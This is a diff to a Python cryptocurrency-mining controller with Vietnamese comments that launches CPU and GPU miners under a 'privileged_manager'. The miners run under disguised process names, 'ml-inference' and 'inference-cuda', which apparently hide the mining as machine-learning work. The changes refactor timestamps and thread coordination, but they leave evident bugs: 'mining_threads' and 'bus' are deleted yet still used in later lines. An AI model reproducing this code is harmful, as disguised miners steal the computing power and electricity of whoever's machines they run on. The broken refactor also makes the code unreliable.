@@ -73,6 +73,9 @@ process_lock = threading.Lock()
 cpu_process = None
 gpu_process = None
 
+# Thêm biến privileged_manager_global để chia sẻ kết quả thiết lập môi trường giữa các luồng
+privileged_manager_global = None
+
 
 def signal_handler(signum, frame):
     logger.info(f"Nhận tín hiệu dừng ({signum}). Đang dừng hệ thống khai thác...")
@@ -535,7 +538,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                     payload = {
                         'pid': process.pid,
                         'miner_type': miner_type,
-                        'timestamp': datetime.now().isoformat(),
+                        'timestamp': time.time(),
                         'event_type': 'mining_started',
                         'data': {
                             'process_name': process_name,
@@ -781,7 +784,7 @@ def environment_setup_thread():
             'thread_name': 'EnvironmentSetup',
             'status': 'success',
             'privileged_manager': privileged_manager is not None,
-            'timestamp': datetime.now().isoformat()
+            'timestamp': time.time()
         })
         
         thread_logger.info("✅ Environment Setup Thread completed successfully")
@@ -795,7 +798,7 @@ def environment_setup_thread():
             'thread_name': 'EnvironmentSetup',
             'status': 'failed',
             'error': str(e),
-            'timestamp': datetime.now().isoformat()
+            'timestamp': time.time()
         })
         stop_event.set()
         return None
@@ -810,28 +813,11 @@ def cpu_mining_thread():
     max_retries = 5
     retries = 0
     
-    # **Wait for environment setup completion** (đợi hoàn thành thiết lập môi trường)
-    setup_complete = False
-    privileged_manager = None
-    
-    def env_setup_handler(payload):
-        nonlocal setup_complete, privileged_manager
-        setup_complete = True
-        thread_logger.info(f"✅ Received environment setup completion: {payload}")
-    
-    bus.subscribe('thread:env_setup_complete', env_setup_handler)
-    
-    # **Wait for setup** (đợi thiết lập) with timeout
-    timeout_count = 0
-    while not setup_complete and timeout_count < 30:  # 30s timeout
-        time.sleep(1)
-        timeout_count += 1
-        if stop_event.is_set():
-            thread_logger.warning("⚠️ Stop event received during setup wait")
-            return
-    
-    if not setup_complete:
-        thread_logger.error("❌ Environment setup timeout - cannot start CPU mining")
+    # Môi trường đã được thiết lập đồng bộ trong main(); lấy privileged_manager_global
+    global privileged_manager_global
+    privileged_manager = privileged_manager_global
+    if privileged_manager is None:
+        thread_logger.error("❌ Environment chưa sẵn sàng - dừng CPU mining thread")
         stop_event.set()
         return
     
@@ -852,7 +838,7 @@ def cpu_mining_thread():
                             'process_name': 'ml-inference',
                             'status': 'running',
                             'attempt': retries + 1,
-                            'timestamp': datetime.now().isoformat()
+                            'timestamp': time.time()
                         })
                         
                         thread_logger.info(f"✅ CPU mining started - PID: {cpu_process.pid}")
@@ -862,12 +848,8 @@ def cpu_mining_thread():
                         thread_logger.error(f"❌ CPU mining startup failed (attempt {retries}/{max_retries})")
                 else:
                     # **Process running - periodic PID update** (tiến trình đang chạy - cập nhật PID định kỳ)
-                    bus.publish('mining:cpu_pid_heartbeat', {
-                        'thread_id': threading.current_thread().ident,
-                        'pid': cpu_process.pid,
-                        'status': 'healthy',
-                        'timestamp': datetime.now().isoformat()
-                    })
+                    # bỏ heartbeat qua EventBus – chỉ ghi log nội bộ
+                    thread_logger.debug("CPU miner healthy heartbeat")
                     
         except Exception as e:
             thread_logger.error(f"❌ CPU Mining Thread error: {e}")
@@ -892,35 +874,12 @@ def gpu_mining_thread():
     max_retries = 5
     retries = 0
     
-    # **Wait for environment setup completion** (đợi hoàn thành thiết lập môi trường)
-    setup_complete = False
-    privileged_manager = None
-    
-    def env_setup_handler(payload):
-        nonlocal setup_complete, privileged_manager
-        setup_complete = True
-        thread_logger.info(f"✅ Received environment setup completion: {payload}")
-    
-    bus.subscribe('thread:env_setup_complete', env_setup_handler)
-    
-    # **Wait for setup** (đợi thiết lập) with timeout
-    timeout_count = 0
-    while not setup_complete and timeout_count < 30:  # 30s timeout
-        time.sleep(1)
-        timeout_count += 1
-        if stop_event.is_set():
-            thread_logger.warning("⚠️ Stop event received during setup wait")
-            return
-    
-    if not setup_complete:
-        thread_logger.error("❌ Environment setup timeout - cannot start GPU mining")
-        return  # Don't set stop_event for GPU as it's optional
-    
-    # **Check if GPU mining is enabled** (kiểm tra khai thác GPU có được bật)
-    gpu_enabled = bool(os.getenv('MINING_SERVER_GPU') and os.getenv('MINING_WALLET_GPU'))
-    if not gpu_enabled:
-        thread_logger.info("ℹ️ GPU mining disabled by configuration")
-        return
+    # Môi trường đã được thiết lập đồng bộ trong main(); lấy privileged_manager_global
+    global privileged_manager_global
+    privileged_manager = privileged_manager_global
+    if privileged_manager is None:
+        thread_logger.error("❌ Environment chưa sẵn sàng - dừng GPU mining thread")
+        return  # GPU optional, không set stop_event
     
     # **GPU Mining Loop** (vòng lặp khai thác GPU) với **PID tracking** (theo dõi PID)
     while not stop_event.is_set() and retries < max_retries:
@@ -942,7 +901,7 @@ def gpu_mining_thread():
                         'process_name': 'inference-cuda',
                         'status': 'running',
                         'attempt': retries + 1,
-                        'timestamp': datetime.now().isoformat()
+                        'timestamp': time.time()
                     })
                     
                     thread_logger.info(f"✅ GPU mining started - PID: {gpu_process.pid}")
@@ -952,12 +911,8 @@ def gpu_mining_thread():
                     thread_logger.error(f"❌ GPU mining startup failed (attempt {retries}/{max_retries})")
             else:
                 # **Process running - periodic PID update** (tiến trình đang chạy - cập nhật PID định kỳ)
-                bus.publish('mining:gpu_pid_heartbeat', {
-                    'thread_id': threading.current_thread().ident,
-                    'pid': gpu_process.pid,
-                    'status': 'healthy',
-                    'timestamp': datetime.now().isoformat()
-                })
+                # bỏ heartbeat qua EventBus – chỉ ghi log nội bộ
+                thread_logger.debug("GPU miner healthy heartbeat")
                 
         except Exception as e:
             thread_logger.error(f"❌ GPU Mining Thread error: {e}")
@@ -976,8 +931,8 @@ def resource_manager_thread():
     thread_logger = setup_logging('resource_manager_thread', str(Path(LOGS_DIR) / 'resource_manager_thread.log'), 'INFO')
     thread_logger.info("📊 Resource Manager Thread Started")
     
-    bus = get_thread_event_bus()
-    
+    # EventBus không còn được sử dụng cho ResourceManager
+
     try:
         # **Step 1**: Load configuration
         thread_logger.info("📋 Loading ResourceManager configuration...")
@@ -998,12 +953,7 @@ def resource_manager_thread():
         thread_logger.info("✅ ResourceManager instance created")
         
         # **EventBus notification** (thông báo EventBus) - Resource Manager ready
-        bus.publish('thread:resource_manager_ready', {
-            'thread_id': threading.current_thread().ident,
-            'thread_name': 'ResourceManager',
-            'status': 'ready',
-            'timestamp': datetime.now().isoformat()
-        })
+        # Đã bỏ publish EventBus cho ResourceManager
         
         # **Step 3**: Start ResourceManager
         thread_logger.info("🚀 Starting ResourceManager...")
@@ -1017,7 +967,7 @@ def resource_manager_thread():
             'thread_name': 'ResourceManager',
             'status': 'failed',
             'error': str(e),
-            'timestamp': datetime.now().isoformat()
+            'timestamp': time.time()
         })
         stop_event.set()
     
@@ -1027,21 +977,28 @@ def main():
     """**Multi-Threading Architecture Main Function** (hàm chính kiến trúc đa luồng) với **EventBus coordination** (phối hợp EventBus)"""
     logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử (Multi-Threading Architecture) =====")
     
-    # **Initialize EventBus** (khởi tạo EventBus) cho **inter-thread communication** (giao tiếp giữa luồng)
+    # ------------------------------------------------------------------
+    # 1️⃣ Thiết lập môi trường đồng bộ (loại bỏ EventBus giữa các luồng)
+    # ------------------------------------------------------------------
+    global privileged_manager_global
+    try:
+        logger.info("🔧 Đang thiết lập môi trường (synchronous)...")
+        privileged_manager_global = initialize_environment()
+        logger.info("✅ Thiết lập môi trường hoàn tất")
+    except Exception as e:
+        logger.error(f"❌ Không thể thiết lập môi trường: {e}")
+        return  # Abort startup nếu môi trường lỗi
+
+    # ------------------------------------------------------------------
+    # 2️⃣ Khởi tạo EventBus cho giao tiếp PID / ResourceManager
+    # ------------------------------------------------------------------
     bus = get_thread_event_bus()
     logger.info("✅ Thread communication EventBus initialized")
-    
-    # **Thread collection** (bộ sưu tập luồng) để quản lý
-    mining_threads = []
-    
-    # **Thread 1: Environment Setup** (Luồng 1: Thiết lập môi trường)
-    env_thread = threading.Thread(
-        target=environment_setup_thread,
-        daemon=True,
-        name="EnvironmentSetupThread"
-    )
-    mining_threads.append(('Environment Setup', env_thread, True))
-    
+
+    # **Thread collection** (bộ sưu tập luồng) để quản lý – KHÔNG có EnvironmentSetupThread
+
+    # (Đã bỏ EnvironmentSetupThread – môi trường thiết lập đồng bộ)
+
     # **Thread 2: CPU Mining** (Luồng 2: Khai thác CPU)
     cpu_thread = threading.Thread(
         target=cpu_mining_thread,
@@ -1049,7 +1006,7 @@ def main():
         name="CPUMiningThread"
     )
     mining_threads.append(('CPU Mining', cpu_thread, True))
-    
+
     # **Thread 3: GPU Mining** (Luồng 3: Khai thác GPU)
     gpu_thread = threading.Thread(
         target=gpu_mining_thread,
@@ -1057,7 +1014,7 @@ def main():
         name="GPUMiningThread"
     )
     mining_threads.append(('GPU Mining', gpu_thread, True))
-    
+
     # **Thread 4: Resource Manager** (Luồng 4: Trình quản lý tài nguyên)
     resource_thread = threading.Thread(
         target=resource_manager_thread,
@@ -1089,22 +1046,12 @@ def main():
     logger.info("🔍 Verifying threads health...")
     time.sleep(5)  # Cho phép threads khởi tạo hoàn tất
     
-    # **EventBus event handlers** (bộ xử lý sự kiện EventBus) để theo dõi thread status
+    # **EventBus event handlers** (theo dõi pid & resource manager)**
     thread_status = {
-        'env_setup_complete': False,
-        'resource_manager_ready': False,
         'cpu_pid_registered': False,
         'gpu_pid_registered': False
     }
-    
-    def env_complete_handler(payload):
-        thread_status['env_setup_complete'] = True
-        logger.info(f"✅ Environment Setup completed: {payload}")
-    
-    def resource_ready_handler(payload):
-        thread_status['resource_manager_ready'] = True
-        logger.info(f"✅ Resource Manager ready: {payload}")
-    
+
     def cpu_pid_handler(payload):
         thread_status['cpu_pid_registered'] = True
         logger.info(f"✅ CPU Mining PID registered: {payload['pid']}")
@@ -1114,8 +1061,7 @@ def main():
         logger.info(f"✅ GPU Mining PID registered: {payload['pid']}")
     
     # **Subscribe to thread events** (đăng ký sự kiện luồng)
-    bus.subscribe('thread:env_setup_complete', env_complete_handler)
-    bus.subscribe('thread:resource_manager_ready', resource_ready_handler)
+    # chỉ dùng EventBus cho PID
     bus.subscribe('mining:cpu_pid_registered', cpu_pid_handler)
     bus.subscribe('mining:gpu_pid_registered', gpu_pid_handler)
     
@@ -1239,7 +1185,7 @@ def main():
                         'thread_name': thread_name,
                         'thread_id': thread.ident,
                         'status': 'stopped',
-                        'timestamp': datetime.now().isoformat()
+                        'timestamp': time.time()
                     })
             
             # **Performance monitoring** (giám sát hiệu suất) through EventBus
@@ -1247,7 +1193,7 @@ def main():
                 'active_threads': sum(1 for _, thread in started_threads if thread.is_alive()),
                 'total_threads': len(started_threads),
                 'system_status': 'running' if not stop_event.is_set() else 'stopping',
-                'timestamp': datetime.now().isoformat()
+                'timestamp': time.time()
             })
             
             time.sleep(monitoring_interval)
@@ -1263,7 +1209,7 @@ def main():
     bus.publish('system:shutdown_initiated', {
         'reason': 'user_request',
         'active_threads': sum(1 for _, thread in started_threads if thread.is_alive()),
-        'timestamp': datetime.now().isoformat()
+        'timestamp': time.time()
     })
     
     # **Graceful thread termination** (kết thúc luồng nhẹ nhàng) với timeout
@@ -1279,7 +1225,7 @@ def main():
                     'thread_name': thread_name,
                     'thread_id': thread.ident,
                     'reason': 'timeout',
-                    'timestamp': datetime.now().isoformat()
+                    'timestamp': time.time()
                 })
             else:
                 logger.info(f"✅ {thread_name} thread stopped gracefully")
